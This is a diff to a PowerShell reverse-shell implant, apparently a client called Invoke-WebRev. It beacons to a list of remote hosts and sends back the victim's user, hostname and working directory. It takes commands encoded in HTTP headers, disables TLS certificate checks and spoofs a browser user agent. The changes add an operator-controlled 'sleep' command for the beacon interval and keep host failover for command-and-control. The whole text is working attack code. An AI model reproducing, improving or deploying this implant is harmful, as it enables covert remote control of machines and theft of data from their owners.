@@ -16,15 +16,16 @@ function Invoke-WebRev{
 
     $strhash = Get-StringHash;
     $clientid = toBase64 -str $strhash;
-    $json = '{"type":"newclient", "result":"", "pwd":"' + $pwd_b64 + '", "cuser":"' + $cuser + '", "hostname":"' + $hname + '", "clientid":"' + $clientid + '"}';
+    $type = '"type":"newclient"';
+    $json = '{' + $type + ', "result":"", "pwd":"' + $pwd_b64 + '", "cuser":"' + $cuser + '", "hostname":"' + $hname + '", "clientid":"' + $clientid + '"}';
     $headers = @{'X-Request-ID' = $strhash;}
+    $sleepTime = 5;
     
     [System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy();
     [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
     $AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12';
     [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols;
     [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
-
     try { $error[0] = ""; } catch {}
     $i=0
     $previous_functions = (ls function:).Name;
@@ -34,8 +35,7 @@ function Invoke-WebRev{
     {
         try
         {
-	    $e=(3,5,8,10 | Get-Random) #I try to be more stealth
-	    start-sleep -s $e
+	        start-sleep -s $sleepTime
             $req = Invoke-WebRequest $url -useb -Method POST -Body $json -Headers $headers -UserAgent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" -ContentType "application/json";
             $header = $req.Headers["Authorization"];
             $c = [System.Convert]::FromBase64String($header);
@@ -127,6 +127,31 @@ function Invoke-WebRev{
                     $result = '[!] Error loading PS1!';
                 }
             }
+            elseif($cstr.split(" ")[0] -eq "sleep")
+            {
+                $type = '"type":"SL33P"';
+                try
+                {
+                    #test if cstr have 2 words
+                    if ($cstr.split(" ").Length -eq 2) {
+                        $sleepTime = $cstr.split(" ")[1];
+                        #check if sleepTime is a number and if it's bigger than 0
+                        if ($sleepTime -eq [System.Int32]::Parse($sleepTime) -and $sleepTime -gt 0) {
+                            start-sleep -s $sleepTime
+                            $result = '[+] Sleep sucessfully. Now the request will be sent after ' + $sleepTime + ' seconds.'
+                        }
+                        else {
+                            $type = '"type":"3RR0R"';
+                            $result = '[!] Sleep time must be a number and bigger than 0!';
+                        }
+                    }
+                }
+                catch
+                {
+                    $type = '"type":"3RR0R"';
+                    $result = '[!] Error loading PS1!';
+                }
+            }
             else
             {
                 $type = '"type":"C0MM4ND"';                
@@ -152,10 +177,11 @@ function Invoke-WebRev{
                     $type = '"type":"3RR0R"';
                     $err = $error[0] | Out-String;
                     $error[0]= "";
-		    $i+=1;
-		    if ($i -gt $hosts.Length){ $i = 0;}
-		    $ip=$hosts[$i]; #We lose the connectio, and try another hosts.
-		    if ($ssl) { $url="https://" + $ip + ":" + $port + "/"; } else { $url="http://" + $ip + ":" + $port + "/"; }
+                    $i+=1;
+                    if ($i -gt $hosts.Length){ $i = 0; }
+                    $ip=$hosts[$i]; #We lose the connectio, and try another hosts.
+                    $type = '"type":"newclient"'; #Always that client is new, we send him a new client.
+                    if ($ssl) { $url="https://" + $ip + ":" + $port + "/"; } else { $url="http://" + $ip + ":" + $port + "/"; }
                     $bytes = $enc.GetBytes($err);
                     $result = [Convert]::ToBase64String($bytes);
                     $json = '{' + $type + ', "result":"' + $result + '", "pwd":"' + $pwd_b64 + '", "cuser":"' + $cuser + '", "hostname":"' + $hname + '", "clientid":"' + $clientid + '"}'
